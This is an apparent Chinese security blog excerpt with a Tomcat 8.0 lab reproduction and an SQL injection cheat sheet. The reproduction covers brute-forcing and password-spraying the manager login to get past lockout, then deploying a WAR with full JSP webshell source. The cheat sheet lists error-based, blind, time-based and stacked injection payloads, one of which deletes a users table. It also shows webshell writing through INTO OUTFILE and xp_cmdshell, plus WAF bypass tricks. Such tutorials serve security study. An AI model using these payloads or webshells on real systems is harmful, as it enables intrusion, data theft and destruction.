<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -dt --name tomcat8 -p 8080:8080 --rm vulhub/tomcat:8.0</span><br></pre></td></tr></table></figure>

<p>查看镜像 id</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps</span><br><span class="line">f041c22a9dfe</span><br></pre></td></tr></table></figure>

<p>替换掉 docker 保存用户名和密码的文件,方便后面进行爆破测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp tomcat-users.xml f041c22a9dfe:/usr/local/tomcat/conf/tomcat-users.xml</span><br></pre></td></tr></table></figure>

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Tomcat8.0漏洞复现/image-20211017132938401.png" alt="image-20211017132938401" style="zoom:50%;" />

<ol start="4">
<li>重启 docker</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker restart f041c22a9dfe</span><br></pre></td></tr></table></figure>

<h2 id="0x03-复现流程"><a href="#0x03-复现流程" class="headerlink" title="0x03 复现流程"></a>0x03 复现流程</h2><h3 id="1-弱密码爆破"><a href="#1-弱密码爆破" class="headerlink" title="1. 弱密码爆破"></a>1. 弱密码爆破</h3><h4 id="1-1-弱口令爆破–-使用-BurpSuite-爆破"><a href="#1-1-弱口令爆破–-使用-BurpSuite-爆破" class="headerlink" title="1.1 弱口令爆破– 使用 BurpSuite 爆破"></a>1.1 弱口令爆破– 使用 BurpSuite 爆破</h4><p>访问manager后台: <code>http://127.0.0.1:8080/manager/html</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Tomcat8.0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20211017133304797.png" alt="image-20211017133304797"></p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Tomcat8.0漏洞复现/image-20211017133404473.png" alt="image-20211017133404473" style="zoom: 33%;" />

<p>提示需要输入用户名和密码,配置代理,启动 bp ,抓包,开始爆破:</p>
<p>抓包后可以看到用户名和密码的提交格式为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username:password</span><br></pre></td></tr></table></figure>

<p>然后对其进行 Base64 编码.</p>
<p>设置爆破变量:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Tomcat8.0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20211017133542197.png" alt="image-20211017133542197"></p>
<p>设置 <code>Payload type</code> 为 <code>Custom iterator</code>,在 <code>Position 1</code> 的位置添加用户名:</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Tomcat8.0漏洞复现/image-20211017133559580.png" alt="image-20211017133559580" style="zoom:50%;" />

<p>在 <code>Position 2</code> 的位置添加 <code>:</code> 号</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Tomcat8.0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20211017133825945.png" alt="image-20211017133825945"></p>
<p>在 <code>Position 3</code> 的位置添加密码:</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Tomcat8.0漏洞复现/image-20211017134009509.png" alt="image-20211017134009509" style="zoom: 50%;" />

<p>在 <code>Payload Processing</code> 处设置为 Base64 编码,并且取消勾选 <code>Url Encoding</code>:</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Tomcat8.0漏洞复现/image-20211017134222054.png" alt="image-20211017134222054" style="zoom:50%;" />

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Tomcat8.0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20211017134129638.png" alt="image-20211017134129638"></p>
<p>爆破成功:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Tomcat8.0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20211017134357035.png" alt="image-20211017134357035"></p>
<p>这个顺序很有讲究，在实际测试中，tomcat6&#x2F;7&#x2F;8+会针对登陆次数过多的用户进行锁定，经过统计分析，当登录错误&gt;5次后，就会锁定用户。这时候我们就要考虑如何绕过。CSDN上有个脚本利用的是占满tomcat缓存的方式绕过，当同一账号大于5次登录，就会采用脏数据去进行登录，直到缓存占满后，又会用剩下的可能存在的username进行登录。直到找到password为止。<a href="https://download.csdn.net/download/lwhat007/10164298">tomcat暴破图形化—绕过tomcat 6&#x2F;7&#x2F;8的防暴破机制</a></p>
<p>这里我们采用针对同一弱口令去爆破不同账号的方式进行猜解，将可能存在的username放入position1的位置，其次放置password在position3的位置，最后attack时爆破的顺序如下图，就不会针对同一账号锁定。这样做的好处在于我们针对同一个口令去爆破大量用户时，由于用户不同，不会被锁定，同时由于第二次使用这个账户爆破其他口令时，tomcat的缓存有很大几率被占满，就不会导致锁定。</p>
<blockquote>
<p>原理就是 密码喷洒</p>
</blockquote>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Tomcat8.0漏洞复现/image-20211017134936684.png" alt="image-20211017134936684" style="zoom: 80%;" />

<h4 id="1-2-弱口令爆破–使用msf自带模块爆破"><a href="#1-2-弱口令爆破–使用msf自带模块爆破" class="headerlink" title="1.2 弱口令爆破–使用msf自带模块爆破"></a>1.2 弱口令爆破–使用msf自带模块爆破</h4><p>msf有一个自带的爆破该后台的模块，但是显然也没有考虑到后续版本对这个策略的绕过，不过无论哪个绕过方式都不适当，因为请求的次数太多，都需要结合实际考虑是否使用。但是这个模块依旧有意义的点在于它的username和password是十分易于存在的用户名和弱口令，且数目很少，假如存在弱口令，也顶多是这个；不存在弱口令，在无可奈何的情况下，也就是只能采用我们上述的办法。下面是爆破过程。</p>
<blockquote>
<p> 但可以通过修改用户名字典的方法实现类似 BP 的爆破</p>
</blockquote>
<p>首先使用爆破模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/http/tomcat_mgr_login</span><br></pre></td></tr></table></figure>

<p>展示选项</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; show options</span><br></pre></td></tr></table></figure>

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Tomcat8.0漏洞复现/image-20211017135728791.png" alt="image-20211017135728791" style="zoom:50%;" />

<p>可以通过指定 <code>USER_FILE</code> 的方式,实现密码喷洒攻击.但这里不进行演示.</p>
<p>然后设置参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set rhosts xxx</span><br><span class="line">set rport xxx</span><br></pre></td></tr></table></figure>

<p>直接 run</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Tomcat8.0漏洞复现/image-20211017140046543.png" alt="image-20211017140046543" style="zoom:50%;" />

<p>从结果可以看出,其并没有考虑到五次密码限制.</p>
<h3 id="2-部署-war-包-并-getshell"><a href="#2-部署-war-包-并-getshell" class="headerlink" title="2. 部署 war 包,并 getshell"></a>2. 部署 war 包,并 getshell</h3><ol>
<li>使用中国蚁剑生成一个 <code>jsp</code> 马,将其单独放置于一个目录下,进入该目录</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir tomcat</span><br><span class="line">cd tomcat</span><br><span class="line">vim jsp</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%-- 使用时请删除此行, 连接密码: 123 --%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">class WELL extends ClassLoader&#123;</span><br><span class="line">  WELL(ClassLoader c)&#123;super(c);&#125;</span><br><span class="line">  public Class destructuring(byte[] b)&#123;</span><br><span class="line">    return super.defineClass(b, 0, b.length);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">public byte[] temporary(String str) throws Exception &#123;</span><br><span class="line">  Class base64;</span><br><span class="line">  byte[] value = null;</span><br><span class="line">  try &#123;</span><br><span class="line">    base64=Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">    Object decoder = base64.newInstance();</span><br><span class="line">    value = (byte[])decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[] &#123;String.class &#125;).invoke(decoder, new Object[] &#123; str &#125;);</span><br><span class="line">  &#125; catch (Exception e) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      base64=Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">      Object decoder = base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);</span><br><span class="line">      value = (byte[])decoder.getClass().getMethod(&quot;decode&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; str &#125;);</span><br><span class="line">    &#125; catch (Exception ee) &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return value;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">String cls = request.getParameter(&quot;123&quot;);</span><br><span class="line">if (cls != null) &#123;</span><br><span class="line">  new WELL(this.getClass().getClassLoader()).destructuring(temporary(cls)).newInstance().equals(request);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>将 shell.jsp 马打包成 war 包</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jar -cvf shell.war shell.jsp</span><br></pre></td></tr></table></figure>

<p>或者使用 zip 压缩成 war 包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip shell.war shell.jsp</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>进入登录界面,部署上传</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Tomcat8.0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20211017140900033.png" alt="image-20211017140900033"></p>
<ol start="4">
<li>中国蚁剑连接</li>
</ol>
<p>连接位置为 <code>http://yourip:port/Login/shell.jsp</code></p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Tomcat8.0漏洞复现/image-20211017140957742.png" alt="image-20211017140957742" style="zoom:50%;" />

]]></content>
      <categories>
        <category>漏洞总结</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Sql 注入总结</title>
    <url>/posts/7b6ed634.html</url>
    <content><![CDATA[<h3 id="sql-注入原理："><a href="#sql-注入原理：" class="headerlink" title="sql 注入原理："></a><strong>sql 注入原理：</strong></h3><p>前端提交的数据未作处理或者转义直接带入数据库查询。</p>
<h3 id="sql-注入分类："><a href="#sql-注入分类：" class="headerlink" title="sql 注入分类："></a><strong>sql 注入分类：</strong></h3><p>按变量类型分：数字型、字符型</p>
<p>按 http 提交方式分：POST注入、GET注入、Cookie注入</p>
<p>按注入方式分：布尔注入、联合注入、多语句注入（堆叠注入）、报错注入、延时注入、内联注入</p>
<p>按数据库类型分：</p>
<p>sql：oracle、mysql、mssql、access、sqlite、postgersql</p>
<p>nosql：mongodb、redis</p>
<h3 id="MySQL与MSSQL及ACCESS之间的区别"><a href="#MySQL与MSSQL及ACCESS之间的区别" class="headerlink" title="MySQL与MSSQL及ACCESS之间的区别"></a><strong>MySQL与MSSQL及ACCESS之间的区别</strong></h3><p>1.MySQL5.0以下没有information_schema这个默认数据库</p>
<p>2.ACCESS没有库名，只有表和字段，并且注入时，后面必须跟表名，ACCESS没有注释</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1,2,3 from `table_name` union select 1,2,3 from `table_name`</span><br></pre></td></tr></table></figure>

<p>3.MySQL使用limit排序，ACCESS使用TOP排序（TOP在MSSQL也可使用）</p>
<h3 id="判断三种数据库的语句"><a href="#判断三种数据库的语句" class="headerlink" title="判断三种数据库的语句"></a><strong>判断三种数据库的语句</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL：and length(user())&gt;10</span><br><span class="line"></span><br><span class="line">ACCESS：and (select count(*) from MSysAccessObjects)&gt;0</span><br><span class="line"></span><br><span class="line">MSSQL：and (select count(*)from sysobjects)&gt;0</span><br></pre></td></tr></table></figure>

<h3 id="报错函数总结"><a href="#报错函数总结" class="headerlink" title="报错函数总结"></a>报错函数总结</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.floor()</span><br><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line">2.extractvalue()</span><br><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line"></span><br><span class="line">1 and extractvalue(1,concat(&#x27;~&#x27;,database()))# </span><br><span class="line"></span><br><span class="line">3.updatexml()</span><br><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line"></span><br><span class="line">4.geometrycollection()</span><br><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">6.polygon()</span><br><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">7.multipolygon()</span><br><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">8.linestring()</span><br><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">9.multilinestring()</span><br><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">10.exp()</span><br><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>

<p>每个一个报错语句都有它的原理：</p>
<p>1.floor()</p>
<p>向下取整。</p>
<p>即取不大于x的最大整数。取按照数轴上最接近要求值的左边值。</p>
<p><a href="https://blog.csdn.net/qq_27130557/article/details/120902212">https://blog.csdn.net/qq_27130557/article/details/120902212</a></p>
<p>exp() 报错的原理：exp 是一个数学函数，取e的x次方，当我们输入的值大于709就会报错，然后 ~ 取反它的值总会大于709，所以报错。</p>
<p>updatexml() 报错的原理：由于 updatexml 的第二个参数需要 Xpath 格式的字符串，以 ~ 开头的内容不是 xml 格式的语法，concat() 函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。0x7e&#x3D;‘~’</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆库：?id=1&#x27; and updatexml(1,(select concat(0x7e,(schema_name),0x7e) from information_schema.schemata limit 2,1),1) -- + </span><br><span class="line">爆表：?id=1&#x27; and updatexml(1,(select concat(0x7e,(table_name),0x7e) from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),1) -- +</span><br><span class="line">爆字段：?id=1&#x27; and updatexml(1,(select concat(0x7e,(column_name),0x7e) from information_schema.columns where table_name=0x7573657273 limit 2,1),1) -- +</span><br><span class="line">爆数据：?id=1&#x27; and updatexml(1,(select concat(0x7e,password,0x7e) from users limit 1,1),1) -- +</span><br><span class="line"></span><br><span class="line">#concat 也可以放在外面 updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1)</span><br></pre></td></tr></table></figure>

<p>这里需要注意的是它加了连接字符，导致数据中的 md5 只能爆出 31 位，这里可以用分割函数分割出来：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr(string string,num start,num length);</span><br><span class="line">#string为字符串,start为起始位置,length为长度</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e, substr((select password from users limit 1,1),1,16),0x7e),1) -- +</span><br></pre></td></tr></table></figure>



<h3 id="手工注入流程"><a href="#手工注入流程" class="headerlink" title="手工注入流程"></a><strong>手工注入流程</strong></h3><p>1.判断注入点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">or 1=1--+</span><br><span class="line">&#x27;or 1=1--+</span><br><span class="line">&quot;or 1=1--+</span><br><span class="line">)or 1=1--+</span><br><span class="line">&#x27;)or 1=1--+</span><br><span class="line">&quot;) or 1=1--+</span><br><span class="line">&quot;))or 1=1--+</span><br><span class="line">&#x27; and 1=1 --+ </span><br><span class="line">&#x27; or 1=2 --+</span><br></pre></td></tr></table></figure>

<p>2.获取字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by 1</span><br><span class="line"></span><br><span class="line">order by 50</span><br></pre></td></tr></table></figure>

<p>3.查看显示位尝试使用联合注入</p>
<p>利用and 1&#x3D;2或and 0及id&#x3D;-12查看显示数据的位置</p>
<p>替换显示位改成SQL语句，查看信息（当前数据库，版本及用户名）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and 1=2 union select version(),2,3 --+</span><br></pre></td></tr></table></figure>

<p>再查询所有数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and 1=2 union select (select group_concat(schema_name)from information schema.schemata),2,3</span><br></pre></td></tr></table></figure>

<p>查询所有表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select (select group_concat(table_name)from information_schema.tables),2,3</span><br></pre></td></tr></table></figure>

<p>查询所有字段名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select (select group_concat(column_name)from information_schema.columns),2,3</span><br></pre></td></tr></table></figure>

<p>查询字段内容</p>
<blockquote>
<p>如：查询test库下users表的id及uname字段，用’~’区分id和uname以防字符连接到一起</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select(select group_concat(id,&#x27;~&#x27;,uname)from test.users),2,3</span><br></pre></td></tr></table></figure>

<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>通用报错语句：（测试版本MySQL8.0.12，MySQL5.0，mariadb5.5版本下）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure>

<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><strong>布尔盲注</strong></h4><p>盲注中常用的函数：</p>
<p>1.char() 解ASCII码</p>
<p>2.mid()截取字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">举例：</span><br><span class="line">mid(&#x27;hello&#x27;,1,3)，从第1位开始截取3位，输出位hel</span><br></pre></td></tr></table></figure>

<p>3.substr()与mid()相同，都为截取字符串</p>
<p>4.count()计算查询结果的行数</p>
<p>5.concat()查询结果合并但保持原有行数</p>
<p>6.group_concat()查询结果合并但都放在一行中</p>
<p>7.ascii() 查询ascii码</p>
<h4 id="猜数据库长度-利用二分法"><a href="#猜数据库长度-利用二分法" class="headerlink" title="猜数据库长度(利用二分法)"></a><strong>猜数据库长度(利用二分法)</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 and (length(database()))&gt;1</span><br><span class="line">id=1 and (length(database()))&gt;50</span><br></pre></td></tr></table></figure>

<p>猜第一个字符，第二个字符，以此类推</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and ascii(mid(database(),1,1))&gt;1</span><br><span class="line">and ascii(mid(database(),2,1))&gt;1</span><br></pre></td></tr></table></figure>

<p>查询当前数据库中所有表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select count(table_name)from information_schema.tables where tables_schema=database())&gt;1</span><br><span class="line">and (select count(table_name)from information_schema.tables where tables_schema=database())&gt;10</span><br></pre></td></tr></table></figure>

<p>查询第一个表的长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select length(table_name)from information_schema.tables where tables_schema=database()limit 0,1)&gt;10</span><br></pre></td></tr></table></figure>

<p>查询表的第一个字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and ascii(mid((select table_name from information_schema.tables where table_schema=database()limit 0,1),1,1))&gt;1</span><br></pre></td></tr></table></figure>

<p>查询atelier表里有几个字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and(select count(column_name)from information_schema.columns where table_name = &#x27;atelier&#x27; and table_schema = database())&gt;2</span><br></pre></td></tr></table></figure>

<p>查询第一个字段长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and length((select column_name from information_schema.columns where table_name=&#x27;atelier&#x27; and table_schema= database()limit 0,1))&gt;1</span><br></pre></td></tr></table></figure>

<p>查询字段第一个字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and ascii(mid((select column_name from information_schema.columns where table_schema = &#x27;db83231_asfaa&#x27; and TABLE_NAME =&#x27;atelier&#x27; limit 0,1),1,1))&gt;105</span><br></pre></td></tr></table></figure>

<p>查询字段所有行数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select count(*) from db83231_asfaa.atelier)&gt;4</span><br></pre></td></tr></table></figure>

<p>查询字段名的行数（查询emails表，uname字段）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select count(uname)from security.emails)&gt;7  查询uname的行数</span><br></pre></td></tr></table></figure>

<p>查询字段内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">length((select username from security.users limit 0,1))&gt;10</span><br><span class="line">ascii(mid((select username from security.user limit 0,1),1,1))&gt;100</span><br></pre></td></tr></table></figure>

<h4 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a><strong>延时盲注</strong></h4><p>利用sleep(3)和if(1&#x3D;2,1,0)及case进行延时注入，示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where id=&#x27;1&#x27; or sleep(3) %23</span><br></pre></td></tr></table></figure>

<p>这个没什么好说的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where id= 1 and if(length(version())&gt;10,sleep(3),0);</span><br></pre></td></tr></table></figure>

<p>如果长度大于10，则睡3秒，其他则0秒</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where id= 1 and case length(version())&gt;10 when 1 then sleep(3) else 0 end;</span><br></pre></td></tr></table></figure>

<p>case定义条件，when 后面的1表示ture也代表真，当条件为真时，睡3秒，其他则0秒。</p>
<h4 id="多语句注入（堆叠注入）"><a href="#多语句注入（堆叠注入）" class="headerlink" title="多语句注入（堆叠注入）"></a><strong>多语句注入（堆叠注入）</strong></h4><p>多语句意思就是可以执行多个语句，利用分号进行隔开</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">示例：</span><br><span class="line">id=1&quot;;WAITFOR DELAY &#x27;0:0:3&#x27;;delete from users; --+</span><br><span class="line">id=1&#x27;;select if(length(user(),1,1)&gt;1,sleep(3),1) %23</span><br><span class="line">&#x27;;select if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)&gt;1,sleep(3),1) %23</span><br></pre></td></tr></table></figure>

<h4 id="内联注入"><a href="#内联注入" class="headerlink" title="内联注入"></a><strong>内联注入</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">举例：id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3</span><br></pre></td></tr></table></figure>

<p>利用别名：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,4,a.id,b.id,* from(sys_admin as a inner join sys_admin as b on a.id=b.id)</span><br></pre></td></tr></table></figure>

<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a><strong>getshell</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,(select &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; into outfile &#x27;/var/www/html/404.php&#x27;) --+</span><br></pre></td></tr></table></figure>

<p>也可使用dumpfile进行写入</p>
<p>outfile和dumpfile的区别：</p>
<p>outfile适合导库，在行末尾会写入新行并转义，因此不能写入二进制可执行文件。dumpfile只能执行一行数据。</p>
<p>数据库写入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;echo &quot;&lt;%eXECutegLobaL rEquEst(0)%&gt;&quot; &gt; &quot;c:\www\upload\Files\2019-11\404.asp&quot;&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a><strong>宽字节注入</strong></h4><p>当编码位gbk时，%df%27或%81%27数据为空</p>
<p>就是说客户端发送的数据编码为gbk时，那么可能会吃掉转义字符\反斜杠，闭合之后页面恢复正常，存在宽字节注入</p>
<h4 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h4><p>代码中有urldecode()  函数</p>
<p>%2527  先解码成%27再解码成’单引号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://192.168.100.141/index.php/author=123 --prefix &quot;%2527&quot; --suffix &quot;%23&quot;</span><br></pre></td></tr></table></figure>

<p>-prefix为设置前缀  -suffix为设置后缀</p>
<p>设置后缀，防止sqlmap使用内联注</p>
<p>使用自带的脚本进行注入chardoubleencode.py</p>
<h4 id="图片上传sql注入"><a href="#图片上传sql注入" class="headerlink" title="图片上传sql注入"></a>图片上传sql注入</h4><p>猜结构，为时间戳加文件名</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/640.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/640-16532894590861.jpeg" alt="图片"></p>
<p>替换and sleep(3) 为*进行sqlmap</p>
<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a><strong>二次注入</strong></h4><p>abc’ 数据经过addslashes过滤，单引号前面添加反斜杠abc&#39;，但传到数据库的数据还是abc’</p>
<p>假如在如下场景中，我们浏览一些网站的时候，可以现在注册见页面注册username&#x3D;test’，接下来访问xxx.php?username&#x3D;test’，页面返回id&#x3D;22；</p>
<p>接下来再次发起请求xxx.php?id&#x3D;22，这时候就有可能发生sql注入，比如页面会返回MySQL的错误。</p>
<p>访问xxx.php?id&#x3D;test’ union select 1,user(),3%23，获得新的id&#x3D;40，得到user()的结果，利用这种注入方式会得到数据库中的值。</p>
<h3 id="常用过WAF技巧"><a href="#常用过WAF技巧" class="headerlink" title="常用过WAF技巧"></a><strong>常用过WAF技巧</strong></h3><p>1.特征字符大小写（基本没用）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UnIoN SeLcT 1,2,3</span><br></pre></td></tr></table></figure>

<p>2.内联注释</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1/*!UNION*/%20//*!SELECT*/%201,2,3</span><br></pre></td></tr></table></figure>

<p>3.特殊字符代替空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%09 tab键(水平)、%0a 换行、%0c 新的一页</span><br><span class="line">%0d return功能、%0b tab键(垂直)、%a0空格</span><br></pre></td></tr></table></figure>

<p>4.等价函数和逻辑符号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hex()、bin()==&gt;ascii()</span><br><span class="line">sleep()==&gt;benchmark()</span><br><span class="line">concat_ws()==&gt;group_concat()</span><br><span class="line">mid()、substr()==&gt;substring()</span><br><span class="line">@@version==&gt;version()</span><br><span class="line">@@datadir==&gt;datadir()</span><br><span class="line">逻辑符号：如and和or不能使用时，尝试&amp;&amp;和||双管道符。</span><br></pre></td></tr></table></figure>

<p>5.特殊符号</p>
